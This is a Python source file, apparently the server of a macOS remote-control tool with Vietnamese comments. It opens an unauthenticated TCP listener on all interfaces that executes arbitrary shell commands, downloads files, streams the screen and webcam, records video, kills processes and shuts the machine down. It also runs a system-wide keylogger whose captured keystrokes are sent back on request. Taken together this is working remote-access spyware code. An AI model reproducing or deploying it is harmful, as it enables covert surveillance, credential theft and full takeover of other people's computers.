import socket
import subprocess
import threading
import time
import os
from datetime import datetime
import cv2
import json
import struct 
from PIL import ImageGrab
import io
import numpy as np
from pynput import keyboard
import psutil 

HOST = "0.0.0.0"
PORT = 5001

# --- BIẾN TOÀN CỤC ---
global_cap = None
global_frame = None
camera_lock = threading.Lock()
is_camera_running = True
is_keylogging = False 

# ==========================================
# KEYLOGGER
# ==========================================
def on_press(key):
    global is_keylogging
    if not is_keylogging: return
    try:
        k = key.char
    except AttributeError:
        if key == keyboard.Key.space: k = " [SPACE] "
        elif key == keyboard.Key.enter: k = " [ENTER]"
        elif key == keyboard.Key.backspace: k = " [BACKSPACE] "
        else: k = f" [{str(key).replace('Key.', '')}] "
    try:
        with open("web_keylog.txt", "a") as f: f.write(str(k) + " ")
    except: pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("[INFO] System Keylogger listener ready.")

start_keylogger()

# ==========================================
# HÀM HỆ THỐNG & FILE
# ==========================================
def get_file_bytes(path):
    if os.path.exists(path) and os.path.isfile(path):
        return os.path.getsize(path), open(path, 'rb')
    return 0, None

def list_directory(path):
    try:
        # Nếu path rỗng hoặc là ".", lấy thư mục làm việc hiện tại
        if not path or path == ".": path = os.getcwd()
        
        # --- THÊM DÒNG NÀY: Chuyển thành đường dẫn tuyệt đối ---
        path = os.path.abspath(path)
        # -------------------------------------------------------

        if not os.path.exists(path): return {"error": "Path not found"}
        
        items = []
        for name in os.listdir(path):
            try:
                full_path = os.path.join(path, name)
                is_dir = os.path.isdir(full_path)
                size = os.path.getsize(full_path) if not is_dir else 0
                items.append({
                    "name": name,
                    "type": "folder" if is_dir else "file",
                    "size": size,
                    "path": full_path
                })
            except: pass # Bỏ qua file lỗi quyền truy cập
            
        items.sort(key=lambda x: (x["type"] == "file", x["name"].lower()))
        return {"current_path": path, "items": items}
    except Exception as e: return {"error": str(e)}
    
def run_shell(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return output
    except subprocess.CalledProcessError as e: return e.output
    except Exception as e: return str(e)

# ==========================================
# CÁC HÀM QUẢN LÝ APP (ĐÃ SỬA LỖI)
# ==========================================
def scan_installed_apps():
    found_apps = {}
    app_dirs = ["/Applications", "/System/Applications", "/System/Applications/Utilities", os.path.expanduser("~/Applications")]
    for d in app_dirs:
        if not os.path.exists(d): continue
        try:
            for item in os.listdir(d):
                if item.endswith(".app"):
                    # Lấy tên file .app làm tên ứng dụng
                    app_name = os.path.splitext(item)[0]
                    found_apps[app_name.lower()] = app_name
        except: pass
    return dict(sorted(found_apps.items(), key=lambda item: item[1]))

APPS = scan_installed_apps()

def is_app_running(app_name):
    # Kiểm tra xem app có đang chạy không bằng lệnh pgrep -f "AppName"
    try:
        subprocess.check_output(["pgrep", "-f", app_name])
        return True
    except subprocess.CalledProcessError:
        return False

def start_app(app_name):
    # Dùng lệnh 'open -a' của macOS để mở app
    try:
        subprocess.run(["open", "-a", app_name], check=True)
        return f"[OK] Started {app_name}"
    except Exception as e:
        return f"[ERROR] Failed to start {app_name}: {e}"

def stop_app(app_name):
    # CÁCH 1: Dùng AppleScript để thoát nhẹ nhàng (Khuyên dùng)
    try:
        print(f"Attempting to quit {app_name} via osascript...")
        cmd = f'quit app "{app_name}"'
        subprocess.run(["osascript", "-e", cmd], check=False)
        time.sleep(1) # Đợi 1s để app đóng
        
        if not is_app_running(app_name):
            return f"[OK] Stopped {app_name}"
    except: pass

    # CÁCH 2: Nếu lì lợm, dùng pkill (Force Kill)
    try:
        print(f"Force killing {app_name} via pkill...")
        subprocess.run(["pkill", "-f", app_name], check=False)
        return f"[OK] Force Stopped {app_name}"
    except Exception as e:
        return f"[ERROR] Failed to stop {app_name}: {e}"

# ==========================================
# CÁC HÀM KHÁC (CAMERA, SCREENSHOT...)
# ==========================================
def camera_loop():
    global global_cap, global_frame
    cap = cv2.VideoCapture(0)
    cap.set(3, 640); cap.set(4, 480)
    if not cap.isOpened(): return
    global_cap = cap
    while is_camera_running:
        ret, frame = cap.read()
        if ret:
            with camera_lock: global_frame = frame
        else: time.sleep(0.1)
    cap.release()

threading.Thread(target=camera_loop, daemon=True).start()

def capture_screen_bytes():
    try:
        img = ImageGrab.grab().convert("RGB")
        img.thumbnail((1280, 720))
        b = io.BytesIO()
        img.save(b, format='JPEG', quality=70)
        return b.getvalue()
    except: return None

def capture_webcam_bytes():
    with camera_lock:
        if global_frame is None: return None
        fc = global_frame.copy()
    try: _, b = cv2.imencode('.jpg', fc, [int(cv2.IMWRITE_JPEG_QUALITY), 80]); return b.tobytes()
    except: return None

def send_data(conn, data):
    if data is None: conn.sendall(struct.pack(">L", 0)); return
    conn.sendall(struct.pack(">L", len(data))); conn.sendall(data)

def capture_full_quality_bytes():
    try:
        img = ImageGrab.grab().convert("RGB")
        b = io.BytesIO()
        img.save(b, format='JPEG', quality=95)
        return b.getvalue()
    except: return None

def take_screenshot():
    # Lưu file trên server (nếu cần)
    try:
        os.makedirs("screenshots", exist_ok=True)
        filename = f"screenshots/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        subprocess.run(["screencapture", "-x", filename])
        return f"[OK] Saved: {filename}"
    except: return "[ERROR]"

def record_webcam(seconds):
    out = None
    try:
        os.makedirs("recordings", exist_ok=True)
        filename = f"recordings/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        with camera_lock:
            if global_frame is None: return None
            h, w, _ = global_frame.shape
        out = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'avc1'), 20.0, (w, h))
        start = time.time()
        while (time.time() - start) < seconds:
            with camera_lock:
                if global_frame is not None: out.write(global_frame)
            time.sleep(0.05)
        return filename
    except: return None
    finally:
        if out: out.release()

def shutdown_machine(): subprocess.Popen(["sudo","shutdown","-h","now"]); return "[OK] Shutdown sent"
def restart_machine(): subprocess.Popen(["sudo","shutdown","-r","now"]); return "[OK] Restart sent"

def get_process_json():
    try:
        procs = []
        cpu_count = psutil.cpu_count() or 1
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                pi = p.info
                pi['cpu_percent'] = round(p.cpu_percent() / cpu_count, 1)
                pi['memory_percent'] = round(pi['memory_percent'], 1)
                if pi['cpu_percent'] > 0.0 or pi['memory_percent'] > 0.1: procs.append(pi)
            except: pass
        procs.sort(key=lambda x: x['cpu_percent'], reverse=True)
        return json.dumps(procs[:50])
    except: return "[]"

def get_sys_stats():
    return json.dumps({"cpu": psutil.cpu_percent(interval=None), "ram": psutil.virtual_memory().percent})

def kill_process_id(pid):
    try:
        p = psutil.Process(pid)
        p.terminate()
        return "OK"
    except Exception as e: return f"Error: {e}"

def handle_client(conn, addr):
    global is_keylogging
    try:
        data = conn.recv(4096).decode().strip()
        if not data: return
        parts = data.split()
        command = parts[0].lower()

        if command == "disconnect": return
        
        # --- APP CONTROL ---
        elif command in ("start", "stop"):
             if len(parts) >= 2:
                 # Ghép lại tên app (vì có thể có khoảng trắng)
                 key = " ".join(parts[1:]).lower()
                 name = APPS.get(key, " ".join(parts[1:]))
                 
                 if command == "start": res = start_app(name)
                 else: res = stop_app(name)
                 
                 conn.sendall(res.encode())
             return
             
        elif command == "list_apps":
            status = {k: {"name": v, "running": is_app_running(v)} for k, v in APPS.items()}
            conn.sendall(json.dumps(status).encode()); return

        # --- SYSTEM ---
        elif command == "sys_stats": conn.sendall(get_sys_stats().encode()); return
        elif command == "list_processes_json": conn.sendall(get_process_json().encode()); return
        elif command == "kill_process":
            res = kill_process_id(int(parts[1])) if len(parts)>1 and parts[1].isdigit() else "Error"
            conn.sendall(res.encode()); return
        elif command == "shutdown": conn.sendall(shutdown_machine().encode())
        elif command == "restart": conn.sendall(restart_machine().encode())
        elif command == "shell":
            res = run_shell(" ".join(parts[1:]))
            conn.sendall(res.encode('utf-8', errors='replace')); return

        # --- FILES ---
        elif command == "list_dir":
            path = " ".join(parts[1:]) if len(parts) > 1 else "."
            conn.sendall(json.dumps(list_directory(path)).encode()); return
        elif command == "get_file":
            path = " ".join(parts[1:])
            size, f = get_file_bytes(path)
            conn.sendall(struct.pack(">L", size))
            if f:
                while True:
                    chunk = f.read(4096)
                    if not chunk: break
                    conn.sendall(chunk)
                f.close()
            return

        # --- MEDIA & KEYLOG ---
        elif command == "screen_stream": send_data(conn, capture_screen_bytes()); return
        elif command == "download_screenshot": send_data(conn, capture_full_quality_bytes()); return
        elif command == "webcam_stream": send_data(conn, capture_webcam_bytes()); return
        elif command == "screenshot": conn.sendall(take_screenshot().encode())
        elif command == "webcam_record":
             vp = record_webcam(int(parts[1]))
             if vp and os.path.exists(vp):
                 with open(vp, "rb") as f: send_data(conn, f.read())
                 try: os.remove(vp) 
                 except: pass
             else: send_data(conn, None)
             return
        elif command == "keylog_start": is_keylogging=True; conn.sendall(b"OK"); return
        elif command == "keylog_stop": is_keylogging=False; conn.sendall(b"OK"); return
        elif command == "keylog_clear": open("web_keylog.txt","w").close(); conn.sendall(b"OK"); return
        elif command == "keylog_data":
             try:
                with open("web_keylog.txt", "r") as f: r=f.read()
             except: r=""
             conn.sendall(r.encode()); return
        
        else: conn.sendall(b"Unknown")
    except: pass
    finally: conn.close()

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    print(f"Server listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__": start_server()